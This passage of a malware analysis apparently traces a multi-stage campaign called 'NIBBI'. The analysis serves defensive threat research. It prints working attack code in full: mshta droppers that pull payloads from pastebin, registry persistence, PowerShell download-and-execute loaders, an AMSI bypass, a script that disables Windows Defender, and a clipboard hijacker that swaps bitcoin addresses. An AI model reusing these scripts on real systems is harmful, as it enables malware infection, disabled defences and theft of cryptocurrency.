A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%\n```\n\nAs shown in the above figure, the code is simply URI encoded by replacing each instance of certain characters by one, two or three escape sequences representing the UTF-8 encoding of the character.\n\n```\n<script language=\"VBScript\">'id1CreateObject(\"WScript.Shell\").Run \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\5CzmZ5NS\"\"\"\nCreateObject(\"WScript.Shell\").Run StrReverse(\"/ 08 om/ ETUNIM cs/ etaerc/ sksathcs\") + \"tn \"\"Pornhubs\"\" /tr \"\"\\\"\"mshta\\\"\"http:\\\\pastebin.com\\raw\\5CzmZ5NS\"\" /F \",0\n'id2CreateObject(\"WScript.Shell\").RegWrite StrReverse(\"TRATS\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\" + \"a\"\"\"\"http:\\\\pastebin.com\\raw\\sJEBiiMw\"\"\", \"REG_SZ\"'id3CreateObject(\"WScript.Shell\").RegWrite StrReverse(\"\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\" + \"a\"\"\"\"http:\\\\pastebin.com\\raw\\YL0je2fU\"\"\", \"REG_SZ\"\n'defidCreateObject(\"WScript.Shell\").Run \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\UyFaSxgj\"\"\"CreateObject(\"WScript.Shell\").RegWrite StrReverse(\"FED\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\" + \"a\"\"\"\"http:\\\\pastebin.com\\raw\\UyFaSxgj\"\"\", \"REG_SZ\"\nself.close</script>\n```\n\nThis stage acts as a dropper, in fact, it downloads and executes some pastebin contents through *mshta.exe*.\n\n```image\nAlt: Figure 4: Evidence of the NIBBI author\nDescription: The image shows a screenshot of a Pastebin page edited by a user named \"NIBBI11\". It displays a small piece of VBScript code and some metadata indicating its edit date (April 26, 2020) and view count (2,035). The script code appears to be obfuscated, using HTML character references. Additionally, there is an advertisement banner at the top promoting the GlassWire application. The content is relevant as it illustrates a malicious script used in a cyber-espionage operation.\n```\n\nThis last campaign has been dubbed with the name of the Pastebin user spreading the malicious pastes. This time the name is “NIBBI”. The first component is *5CzmZ5NS*:\n\n```image\nAlt: Figure 5: Piece of the code of 5CzmZ5NS paste\nDescription: The image displays a piece of code related to a cybersecurity threat actor's operation. It is formatted as a JavaScript snippet wrapped in HTML script tags, showcasing obfuscated VBScript commands that utilize the 'WScript.Shell' object to execute various functions. The code includes functions for writing to the Windows registry and running commands that download malicious content from the internet. The URI encoding is evident, as it replaces characters with their UTF-8 encoded equivalents. This snippet is part of a broader discussion on the use of the mshta.exe tool in cyber-criminal operations.\nTranscription: |\n  html\n  <script>\n  <!--\n  document.write(unescape(\n  \"%3Cscript%20language%3D%22%26%238%3B%26%236%3B%26%2383%3B%26%2\n  399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%22%3E%3C%0Ar\n  eateObject%28%22WScript.Shell%22%29.RegWrite%20%22HKCU%5CSoftware\n  %5CMicrosoft%5CWindows%5CCurrentVersion%5CRun%5Cbin%22%2C%20%22ms\n  hta%20vbscript%3AExecute%28%22CreateObject%28%22%22WScript.Scri\n  pt.Shell%22%22%22%29.Run%20%22%22powershell%20%28%28gp%20%22HKCU%5CSoftware%29..iamresearcher%29%7CIE%22%22%22%29%20%3E%20window.close%22%29%22%2C%20%22REG_SZ%22%0A%0ACreateObj\n  ect%28%22Wscript.Shell%22%29.regwrite%20%22HKCU%5CSoftware%5Ciamr\n  esearcher%22%2C%22fuckscecurityresearchers%3B%27contactme%27%27.replace%28%27contactme%27%2C%27T%27%29%3Bsla2l0M%20%24fucksecu\n  rityresearchers3Bdo%20%7B%24ping%20%3D%20test-connection%20-comp\n```\n\nThe second one is *sJEBiiMw*:\n\n```image\nAlt: Figure 6: Piece of the code of the sJEBiiMw paste\nDescription: The image depicts a snippet of JavaScript code embedded within HTML script tags. The code contains a 'document.write' statement that uses 'unescape' to decode URI encoded characters. This suggests that it is part of an obfuscated script, likely used in a cyber threat context, to execute malicious actions while evading detection. The presence of comments and encoded characters indicates that this code is designed to be executed in a web browser environment, potentially as part of a larger malicious payload.\nTranscription: |\n  html\n  <script>\n  <!--\n  document.write(unescape(\n  \"%3Cscript%20language%3D%22%26%2386%3B%26%2383%3B%26%2393%3B%26%23105%3B%26%23105%3B%26%23116%3B%22%3E%0AConst%20HIDDEN_WINDOW%20%3D%200%0AstrComputer%20%3D%20%22.%22%0ASet%20objWMIService%20%3D%20GetObject%28%22winmgmts%3A%7BimpersonationLevel%3Dimpersonate%7D%21%5C%5C%22%20%26%20strComputer%20%26%20%22%5Croot%5Ccimv2%22%29%0ASet%20objStartup%20%3D%20objWMIService.Get%28%22Win32_ProcessStartup%22%29%0ASet%20objConfig%20%3D%20objStartup.SpawnInstance_%0AobjConfig.ShowWindow%20%3D%20HIDDEN_WINDOW%0ASet%20objProcess%20%3D%20GetObject%28%22winmgmts%3Aroot%5Ccimv2%3AWin32_Process%22%29%0AerrReturn%20%3D%20objProcess.Create%28%22powershell.exe%20-nologo%20-WindowStyle%20Hidden%20%24Xpin%20%3D%20%22\n```\n\nThe third one, *YL0je2fU*:\n\n```image\nAlt: Figure 7: Piece of the code of the YL0je2fU paste\nDescription: The image presents a snippet of code formatted in a text editor, highlighting a piece of VBScript embedded within HTML `<script>` tags. The code uses `document.write(unescape(...))` to decode a URI-encoded script. The visible portion of the code includes various VBScript commands that execute system functions, such as creating objects and writing to the Windows Registry. This specific script is related to a cyber-espionage operation, demonstrating the use of malicious techniques for payload delivery and persistence.\nTranscription: |\n  html\n  <script>\n  <!--\n  document.write(unescape(\n  \"%3Cscript%20language%3D%22%26%238%3B%26%2383%3B%26%20\n  399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%22%3E%3B%0A%0ACreateObject%28%22WScript.Shell%22%29.RegWrite%20%22HKCU%5CSoftw\n  are%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun%5Creplica%22%2C%20%22mshta%20vbscript%3AExecute%28%22CreateObject%28%22%22Wscript.Shell%22%22%29.Run%20%22%22powershell%20%28\n  get%2DHKCU%3A%5CSoftware%29.mogale%29%7CIE%8%22%...\n```\n\nand the fourth component, *UyFaSxgj*:\n\n```image\nAlt: Figure 8: Piece of the code of the UyFaSxgj paste\nDescription: The image shows a piece of code written in VBScript and JavaScript, intended for use in a cyber-espionage operation. The code is URI-encoded, which means certain characters are replaced with escape sequences representing their UTF-8 encoding. Specifically, it includes commands that leverage the \"mshta.exe\" tool to execute scripts from remote sources, highlighting a technique often used by threat actors to obfuscate their activities. The code appears to be part of a malicious payload that writes to the Windows registry, establishing persistence and enabling further execution of malicious commands.\nTranscription: |\n  html\n  <script>\n  <!--\n  document.write(unescape(\n  \"%3Cscript%20language%3D%22%26%2386%3B%26%2383%3B%26%2393%3B%26%239\n  9%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23112%3B%26%23122%3B%20const%3\n  20HIDDEN_WINDOW%3D%20%20AstrComputer%20%3D%22%22%3A%20Set%20obj\n  WMIService%20%3D%20GetObject%28%22winmgmts%3A%20%7C%20%22%20%26%20imp\n  rsonationLevel%3Dimpersonate%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C\n  26%20%22%5Croot%5Ccimv2%22%29%0ASet%20objStartup%20%3D%20objWMIServ\n  ice.Get%28%22Win32_ProcessStartup%22%29%0ASet%20objConfig%20%3D%20o\n  bjStartup.SpawnInstance_%0AobjConfig.ShowWindow%20%3D%20HIDDEN_WIND\n  OW%0ASet%20objProcess%20%3D%20GetObject%28%22winmgmts%3Aroot%5Ccimv\n  2%3AWin32_Process%3D%22%29%0ArrReturn%20%3D%20objProcess.Create%28%2\n  0powershell.exe%20-nologo%20-WindowStyle%20Hidden%20%24_Xpin%3D%28\n  %22%28New-Object%20Net.WebClient%29.DownloadString%28%27h%27+%27t%2\n  7+%27t%27+%27p%27+%27%3A%27+%27%2F%27+%27%2F%27+%27%77%27+%27%77%27+\n  %27w%27+%27.%27+%27evg%27+%27y%27+%27.%27+%27c%27+%27o%27+%27m%27+%2\n  7%2F%27+%27%27+%27%27+%27%27+%27%27+%27%27+%27%27+%27%27+%27%27+%27%2\n  7%29%24_Xpin%3B%24_Xpin.replace%28%27.%27%2C%27%27%29%28%23%23%23%23\n```\n\nThis obfuscation technique is typical of this particular actor and he largely leveraged it in many malicious operations. Moreover, the usage of a legit website such as pastebin (T1102) gives a significant amount of cover such as advantages of being very often whitelisted. Using such a service permits to reduce the C2 exposure. In the past, other groups also used similar techniques to decouple attack infrastructure information from their implant configuration, groups such as APT41, FIN6 or FIN7.\n\nOnce decoded the first component (5CzmZ5NS), it unveils some logic, as shown in Code Snippet 2. First of all, the script set a registry key, as a windows persistence mechanism (T1060) in which it places the execution of the following command:\n\n```\nmshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\")\n```\n\n```\n<script language=\"VBScript\">CreateObject(\"WScript.Shell\").RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\bin\", \"mshta vbscript:Execute(\"\"CreateObject(\"\"\"\"Wscript.Shell\"\"\"\").Run \"\"\"\"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\"\"\"\", 0 : window.close)\", \"REG_SZ\"\nCreateObject(\"Wscript.Shell\").regwrite \"HKCU\\Software\\iamresearcher\", \"$fucksecurityresearchers='contactmeEX'.replace('contactme','I');sal M $fucksecurityresearchers;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$iwannajoinuiwannaleavedsshit = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $iwannajoinuiwannaleavedsshit;$iwannaleftsellingtools= New-Object -Com Microsoft.XMLHTTP;$iwannaleftsellingtools.open('GET','https://pastebin.com/raw/rnS6CUzX',$false);$iwannaleftsellingtools.send();$iwannaleftsellingtoolsy=$iwannaleftsellingtools.responseText;$asciiChars= $iwannaleftsellingtoolsy -split '-' |ForEach-Object {[char][byte]\"\"0x$_\"\"};$asciiString= $asciiChars -join ''|M;[Byte[]]$Cli2= iex(iex('(&&(GCM *W-O*)'+ 'Net.'+'WebC'+'lient)'+'.Dow'+'nload'+'Str'+'ing(''https://pastebin.com/raw/Rk4engdU'').replace(''#'',''!#!@#'').replace(''!#!@#'',''0x'')')) | g;$iwannaleftsellingtools=[System.Reflection.Assembly]::Load($decompressedByteArray);[rOnAlDo]::ChRiS('InstallUtil.exe',$Cli2)\" , \"REG_SZ\"\nConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" &amp; \"{impersonationLevel=impersonate}!\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\", null, objConfig, intProcessID)'i am not a coder not a expert i am script kiddie expert i read code from samples on site then compile in my way'i am not a coder 😉 i watch you on twitter every day thanks 🙂 i love my code reports!'i am not a coder! bang 😉\nself.close</script>\n```\n\nThe code contains some “funny” comments related to the twitter community of security researchers which constantly monitor the actor operations. Then, the final payload is identified by *Rk4engdU* paste.\n\n```image\nAlt: Figure 9: Piece of the rnS6CUz paste\nDescription: The image displays a segment of encoded text, likely representing a hex string or byte array. The content appears to be related to a cyber threat intelligence context, possibly showcasing obfuscated code or payload data used in malicious operations. The text is arranged in a grid format, with each byte represented by a two-character hexadecimal code, suggesting it is part of a code snippet meant for analysis or decryption.\nTranscription: |\n  66-75-6e-63-74-69-6f-6e-20-55-4e-70-61-43-30-6b-33-33-33-33-30\n  -30-30-31-34-37-35-35-35-20-7b-0a-09-5b-43-6d-64-64-65-7\n  4-42-69-6e-64-69-6e-67-28-29-5d-0a-20-20-20-50-61-72-61-6d-20\n  28-5b-62-79-74-65-5b-5d-5d-20-24-62-79-74-65-41-72-72-61-79-29-0a\n  -20-0a-09-50-72-6f-63-65-73-73-20-7b-0a-09-20-20-20-57-72-69-7\n  n```\n\nDecoding this hex stream we get the following PowerShell code:\n\n```\nfunction UNpaC0k3333300001147555 {\n[CmdletBinding()] Param ([byte[]] $byteArray) Process { Write-Verbose \"Get-DecompressedByteArray\" $input = New-Object System.IO.MemoryStream( , $byteArray ) $output = New-Object System.IO.MemoryStream $01774000 = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)\n$puffpass = New-Object byte[](1024) while($true){ $read = $01774000.Read($puffpass, 0, 1024) if ($read -le 0){break} $output.Write($puffpass, 0, $read) } [byte[]] $bout333 = $output.ToArray() Write-Output $bout333 }}\n$t0='DEX'.replace('D','I');sal g $t0;[Byte[]]$MNB=('\nOBFUSCATED PAYLOAD ONE\n'.replace('@!','0x'))| g;\n[Byte[]]$blindB=('\nOBFUSCATED PAYLOAD TWO\n'.replace('@!','0x'))| g\n[byte[]]$deblindB = UNpaC0k3333300001147555 $blindB\n$blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass()\n[byte[]]$decompressedByteArray = UNpaC0k3333300001147555 $MNB\n```\n\n### The Powershell Loader\n\nThe *Code Snippet 3* is a PowerShell script in which the function “*UNpaC0k3333300001147555*” is declared, having the purpose to manipulate the two payloads in the right way. Both of them are .NET binaries. The de-obfuscated code is stored in the *deblindB* variable and then executed.\n\nAs suggested by the name *deblindB*, invoke the execution of the static method “*Bypass*” of the “*Amsi*” class.\n\n```image\nAlt: Figure 10: Amsi Bypass exploit evidence\nDescription: The image depicts a screenshot of a code editor displaying a section of C# code. It shows an 'Assembly Explorer' view on the left side, listing various assemblies and their components, including one named 'WindowsFormsApplication68.dll'. The right side highlights a method named 'Bypass()' within this assembly. The code includes a loop and several calculations, with references to methods and byte manipulations related to a class named 'Amsi'. The overall context suggests this code is part of a discussion on a cyber threat involving exploitation techniques.\nTranscription: |\n  Assembly Explorer\n  - System.Core (4.0.0.0)\n  - System (4.0.0.0)\n  - System.Xml (4.0.0.0)\n  - WindoBase (4.0.0.0)\n  - System.Data (4.0.0.0)\n  - PresentationCore (4.0.0.0)\n  - PresentationFramework (4.0.0.0)\n  - vbc (0.0.0.0)\n  - Microsoft.VisualBasic (10.0.0.0)\n  - WindowsFormsApplication68 (1.0.0.0)\n    - WindowsFormsApplication68.dll\n      - <Module> @ 02000001\n      - Amsi @ 0200000D\n        - Tipo base interface\n        - Tipi derivati\n        - .cctor() : void @ 06000004\n        - Amsi() : void @ 06000005\n        - Bypass() : void @ 06000006\n      - smethod_0() : bool @ 06000007\n      - smethod_1() : bool @ 06000008\n      - smethod_10(Array, Runtime, Boolean) : void @ 06000009\n      - smethod_10() : Assembly @ 0600000A\n  \n  Bypass() : void\n  // Amsi\n  // Token: 0x06000006 RID: 6 RVA: 0x000067C8 File Offset: 0x000049C8\n  public static void Bypass()\n  {\n      for (;;)\n      {\n          IL_B6:\n          uint num = 3180163207U;\n          for (;;)\n          {\n              uint num2;\n              switch ((num2 = (num ^ 3044402237U)) % 8U)\n              {\n              case 0U:\n                  num2 = num2 * 353395194U ^ 1260883750U;\n                  continue;\n              case 1U:\n                  Amsi.smethod_0(Amsi.byte_0);\n                  num = num * 1216203607U ^ 3605413066U;\n                  continue;\n              case 2U:\n                  {\n                      bool flag = Amsi.smethod_1();\n                      num = num2 * 22176795U ^ 2728639904U;\n                      continue;\n                  }\n              }\n              goto IL_B6;\n          }\n      }\n  }\n```\n\nInstead, the payload embedded inside the variable *$MNB* is another type of injection tool, but this one is not executed by the script, probably because both the binaries perform the same action and only one is sufficient.\n\nAt this point, we deepen the “*sJEBiiMw*” component obtaining:\n\n```\n<script language=\"VBScript\">Const HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" &amp; \"{impersonationLevel=impersonate}!\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell.exe -nologo -WindowStyle Hidden $_Xpin = ((New-Object Net.WebClient).DowNloAdSTRiNg('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'p'+'a'+'s'+'t'+'e'+'b'+'i'+'n'+'.'+'c'+'o'+'m'+'/'+'r'+'a'+'w'+'/ygwLUS9C'));$_Xpin=$_Xpin.replace('.','*!(@*#(!@#*').replace('*!(@*#(!@#*','0');$_Xpin = $_Xpin.ToCharArray();[Array]::Reverse($_Xpin);[byte[]]$_PMP = [System.Convert]::FromBase64String($_Xpin);$_1 = [System.Threading.Thread]::GetDomain().Load($_PMP);$_1.EntryPoint.invoke($S,$X)\", null, objConfig, intProcessID)\nself.close</script>\n```\n\nThis script downloads and executes another script from pastebin: *ygwLUS9C*. It is a base64 encoded script with some basic string replacing. We also noticed this executable uses the CMSTP bypass technique (T1191), already seen in our previous report.\n\n```image\nAlt: Figure 11: CMSTP Bypass evidence\nDescription: The image displays a code analysis environment, likely from a decompiler or development tool, showcasing a section of a malicious software's code. On the left side, the 'Assembly Explorer' tree structure is visible, which lists various components and references of the analyzed executable (final.exe). The highlighted section indicates a class named 'CMSTPBypass,' containing a public static string definition of 'InfData,' which includes configurations for a CMSTP (Connection Manager Profile Setup) bypass technique. The right side shows the detailed string data, which contains various setup commands, indicating the malicious intent of the software to manipulate system settings.\n```\n\nHowever, in this case, there is a new element differently the previous version: through the CMSTP bypass, a VBS script is written in the “%TEMP%” folder, which executes many disruptive commands:\n\n```image\nAlt: Figure 12: Evidence of the VBS script loaded and executed\nDescription: The image shows a code snippet from a programming environment, likely Visual Studio, displaying a C# program that writes a VBS script to a temporary file. The code is framed with highlighted sections indicating the location of a resource ('01ckai4hklb') and its usage in writing a script designed to lower system security settings. The visible script includes commands to modify Windows Defender settings to disable various protections, demonstrating malicious intent. The context suggests this is part of a cyber-espionage operation targeting Italian manufacturing.\n```\n\nThe VBS script, as also mentioned inside the first row as comment, has the objective to set to zero the level of security of the infected machine. The script is the following:\n\n```\n'this script will put system on 0 securityIf Not WScript.Arguments.Named.Exists(\"elevate\") Then CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _ , \"\"\"\" &amp; WScript.ScriptFullName &amp; \"\"\" /elevate\", \"\", \"runas\", 1 WScript.QuitEnd If\nOn Error Resume NextSet WshShell = CreateObject(\"WScript.Shell\")WshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware\",\"0\",\"REG_DWORD\"WshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring\",\"0\",\"REG_DWORD\"WshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection\",\"0\",\"REG_DWORD\"WshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable\",\"0\",\"REG_DWORD\"\nWScript.Sleep 100\noutputMessage(\"Set-MpPreference -DisableRealtimeMonitoring $true\")outputMessage(\"Set-MpPreference -DisableBehaviorMonitoring $true\")outputMessage(\"Set-MpPreference -DisableBlockAtFirstSeen $true\")outputMessage(\"Set-MpPreference -DisableIOAVProtection $true\")outputMessage(\"Set-MpPreference -DisableScriptScanning $true\")outputMessage(\"Set-MpPreference -SubmitSamplesConsent 2\")outputMessage(\"Set-MpPreference -MAPSReporting 0\")outputMessage(\"Set-MpPreference -HighThreatDefaultAction 6 -Force\")outputMessage(\"Set-MpPreference -ModerateThreatDefaultAction 6\")outputMessage(\"Set-MpPreference -LowThreatDefaultAction 6\")outputMessage(\"Set-MpPreference -SevereThreatDefaultAction 6\")\nSub outputMessage(byval args)On Error Resume NextConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" &amp; \"{impersonationLevel=impersonate}!\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell \" + args, null, objConfig, intProcessID)\nEnd SubOn Error Resume NextConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" &amp; \"{impersonationLevel=impersonate}!\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell $cici=@(36,117,115,101,114,80,97,116,104,32,61,32,36,101,110,118,58,85,83,69,82,80,82,79,70,73,76,69,10,36,112,97,116,104,69,120,99,108,117,115,105,111,110,115,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,65,114,114,97,121,76,105,115,116,10,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,65,114,114,97,121,76,105,115,116,10,36,112,97,116,104,69,120,99,108,117,115,105,111,110,115,46,65,100,100,40,39,67,58,92,39,41,32,62,32,36,110,117,108,108,10,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,46,65,100,100,40,39,77,115,98,117,105,108,100,46,101,120,101,39,41,32,62,32,36,110,117,108,108,10,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,46,65,100,100,40,39,67,97,108,99,46,101,120,101,39,41,32,62,32,36,110,117,108,108,10,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,46,65,100,100,40,39,112,111,119,101,114,115,104,101,108,108,46,101,120,101,39,41,32,62,32,36,110,117,108,108,10,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,46,65,100,100,40,39,119,115,99,114,105,112,116,46,101,120,101,39,41,32,62,32,36,110,117,108,108,10,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,46,65,100,100,40,39,109,115,104,116,97,46,101,120,101,39,41,32,62,32,36,110,117,108,108,10,36,112,114,111,106,101,99,116,115,70,111,108,100,101,114,32,61,32,39,100,58,92,39,10,65,100,100,45,77,112,80,114,101,102,101,114,101,110,99,101,32,45,69,120,99,108,117,115,105,111,110,80,97,116,104,32,36,112,114,111,106,101,99,116,115,70,111,108,100,101,114,10,102,111,114,101,97,99,104,32,40,36,101,120,99,108,117,115,105,111,110,32,105,110,32,36,112,97,116,104,69,120,99,108,117,115,105,111,110,115,41,32,10{10,32,32,32,32,87,114,105,116,101,45,72,111,115,116,32,34,65,100,100,105,110,103,32,80,97,116,104,32,69,120,99,108,117,115,105,111,110,58,32,34,32,36,101,120,99,108,117,115,105,111,110,10,32,32,32,32,65,100,100,45,77,112,80,114,101,102,101,114,101,110,99,101,32,45,69,120,99,108,117,115,105,111,110,80,97,116,104,32,36,101,120,99,108,117,115,105,111,110,10,125,10,102,111,114,101,97,99,104,32,40,36,101,120,99,108,117,115,105,111,110,32,105,110,32,36,112,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,115,41,10,123,10,32,32,32,32,87,114,105,116,101,45,72,111,115,116,32,34,65,100,100,105,110,103,32,80,114,111,99,101,115,115,69,120,99,108,117,115,105,111,110,58,32,34,32,36,101,120,99,108,117,115,105,111,110,10,32,32,32,32,65,100,100,45,77,112,80,114,101,102,101,114,101,110,99,101,32,45,69,120,99,108,117,115,105,111,110,80,114,111,99,101,115,115,32,36,101,120,99,108,117,115,105,111,110,10,125,10,87,114,105,116,101,45,72,111,115,116,32,34,34,10,87,114,105,116,101,45,72,111,115,116,32,34,89,111,117,114,32,69,120,99,108,117,115,105,111,110,115,58,34,10,36,112,114,101,102,115,32,61,32,71,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101,10,36,112,114,101,102,115,46,69,120,99,108,117,115,105,111,110,80,97,116,104,10,36,112,114,101,102,115,46,69,120,99,108,117,115,105,111,110,80,114,111,99,101,115,115);[System.Text.Encoding]::ASCII.GetString($cici)|IEX\", null, objConfig, intProcessID)\nself.close</script>\n```\n\nEven in this case, there is a PowerShell script embedded in it using the same variable name “*cici*”, but with the following body:\n\n```\nfunction isBitcoinAddress([string]$clipboardContent){ if($clipboardContent[0] -ne '1') { return $false }\n$strLength = $clipboardContent.length if($strLength -lt 26 -or $strLength -gt 35) { return $false }\n$validRegex = '^[a-zA-Z0-9\\s]+$' if($clipboardContent -cnotmatch $validRegex) { return $false }\nreturn $true}$bitcoinAddresses = (\"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\", \"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\", \"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\", \"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\", \"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\")$bitcoinAddressesSize = $bitcoinAddresses.length$i = 0$oldAddressSet = \"\"while(1){ $clipboardContent = Get-Clipboard if((isBitcoinAddress($clipboardContent)) -ceq $true -and $clipboardContent -cne $oldAddressSet) { Set-Clipboard $bitcoinAddresses[$i] $oldAddressSet = $bitcoinAddresses[$i] $i = ($i + 1) % $bitcoinAddressesSize }}\n```\n\nThe script performs a constant check in the clipboard of the victim machine, looking for bitcoin addresses and some of them are also hardcoded. The last stage is *UyFaSxgj*:\n\n```\n<script language=\"VBScript\">Const HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" &amp; \"{impersonationLevel=impersonate}!\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( 